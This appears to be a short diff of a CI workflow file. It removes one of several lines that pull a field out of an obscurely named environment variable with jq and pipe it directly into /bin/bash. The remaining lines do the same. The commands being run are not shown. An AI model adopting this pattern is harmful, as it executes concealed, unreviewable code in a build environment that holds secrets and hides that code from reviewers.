@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$rhnc476" | jq -r .ayro57 | /bin/bash
           echo $u310 | jq -r .hrw598 | /bin/bash
-          echo $n6668 | jq -r .savny2 | /bin/bash
           printf '%s' "$l533" | jq -r .delf97 | /bin/bash
 
       - name: Upload artifact
